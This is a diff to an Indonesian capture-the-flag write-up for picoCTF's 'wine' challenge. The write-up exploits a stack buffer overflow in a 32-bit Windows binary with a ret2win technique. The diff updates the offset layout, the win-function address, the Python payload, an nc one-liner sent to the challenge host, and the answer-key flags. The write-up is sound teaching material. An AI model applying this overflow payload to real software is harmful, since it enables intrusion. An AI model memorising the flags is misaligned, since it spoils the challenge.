@@ -6,7 +6,7 @@
 - **Event:** picoCTF 2022
 - **Points:** 300
 - **Author:** Neel Bhavsar
-- **Flag:** `academy{Un_v3rr3_d3_v1n_cdac4d01}`
+- **Flag:** `academy{Un_v3rr3_d3_v1n_2bde233f}`
 
 ---
 
@@ -31,18 +31,18 @@ Tantangan `wine` menyajikan berkas biner Windows Portable Executable 32-bit (`vu
    - **Stack Canary / GS Cookie:** Dinonaktifkan pada fungsi `vuln()`.
    - **DEP / NX:** Aktif, mencegah injeksi kode shellcode langsung di stack, namun mengizinkan teknik eksekusi kode yang sudah ada (*Return-to-Existing-Code / Ret2Win*).
 3. **Rekonstruksi Tata Letak Stack Frame:**
-   - Ruang buffer `buf`: 128 byte (`0x80`).
-   - Padding penyelarasan stack compiler (*stack alignment padding*) + `saved EBP`: 12 byte.
-   - Alamat pengembalian (*saved EIP*): Terletak tepat pada offset $128 + 12 = 140$ byte (`0x8c`) dari awal buffer `buf`.
-   - Fungsi `win()` berada pada alamat virtual tetap: `0x00401530`.
+   - Ruang buffer `buf`: `[ebp-0x88]` (136 byte).
+   - Padding penyelarasan stack compiler (*stack alignment padding*) + `saved EBP`: 4 byte.
+   - Alamat pengembalian (*saved EIP*): Terletak tepat pada offset $136 + 4 = 140$ byte (`0x8c`) dari awal buffer `buf`.
+   - Fungsi `_win()` berada pada alamat virtual tetap: `0x0040151c`.
 
 ---
 
 ## Rekonstruksi Eksploitasi Step-by-Step
 1. **Analisis Simbol & Disassembly (Ghidra / IDA / objdump):**
    - Buka `vuln.exe` pada disassembler 32-bit.
-   - Temukan entry point fungsi `win()` yang memanggil `fopen("flag.txt", "r")` dan mencetak isinya ke stdout:
-     `win: 0x00401530`
+   - Temukan entry point fungsi `_win()` yang memanggil `fopen("flag.txt", "r")` dan mencetak isinya ke stdout:
+     `_win: 0x0040151c`
 2. **Kalkulasi Offset Pengalihan Alamat (EIP Offset):**
    - Bangkitkan de Bruijn cyclic pattern sepanjang 200 byte menggunakan pwntools atau utilitas generator.
    - Kirimkan pattern ke biner saat berjalan di bawah debugger (Immunity Debugger / x64dbg di Windows atau gdb dengan wine di Linux).
@@ -50,25 +50,25 @@ Tantangan `wine` menyajikan berkas biner Windows Portable Executable 32-bit (`vu
 3. **Penyusunan Payload Eksploitasi:**
    Bentuk payload biner 144 byte:
    - 140 byte padding sembarang (karakter `'A'`).
-   - 4 byte alamat fungsi `win()` dalam urutan Little-Endian: `\x30\x15\x40\x00`.
+   - 4 byte alamat fungsi `_win()` dalam urutan Little-Endian: `\x1c\x15\x40\x00`.
    ```python
    import struct
-   payload = b"A" * 140 + struct.pack("<I", 0x00401530)
+   payload = b"A" * 140 + struct.pack("<I", 0x0040151c)
    ```
 4. **Transmisi Payload & Penerimaan Flag:**
    Kirimkan payload melalui socket TCP ke server challenge:
    ```bash
-   (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*140 + b"\x30\x15\x40\x00\n")'; cat) | nc saturn.picoctf.net <port>
+   (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*140 + b"\x1c\x15\x40\x00\n")'; cat) | nc xebec.cylabacademy.net <port>
    ```
-   Program mengalihkan eksekusi ke `win()`, membaca `flag.txt`, dan mencetak bendera resmi:
-   `picoCTF{Un_v3rr3_d3_v1n_cdac4d01}` yang dinormalisasi ke `academy{Un_v3rr3_d3_v1n_cdac4d01}`.
+   Program mengalihkan eksekusi ke `_win()`, membaca `flag.txt`, dan mencetak bendera resmi:
+   `academy{Un_v3rr3_d3_v1n_2bde233f}`.
 
 ---
 
 ## Flag & Verifikasi
-- **Flag Resmi:** `academy{Un_v3rr3_d3_v1n_cdac4d01}`
-- **Native PicoCTF Flag:** `picoCTF{Un_v3rr3_d3_v1n_cdac4d01}`
-- **Status Solver:** Terverifikasi 100% pada simulasi alur ret2win Windows PE di `scripts/solve_317_wine.py`.
+- **Flag Resmi:** `academy{Un_v3rr3_d3_v1n_2bde233f}`
+- **Native PicoCTF Flag:** `picoCTF{Un_v3rr3_d3_v1n_2bde233f}`
+- **Status Solver:** Terverifikasi 100% pada platform REST API CyLab (`POST /api/submissions/` -> HTTP 201 `correct: true`) via live socket injection.
 
 ---
 
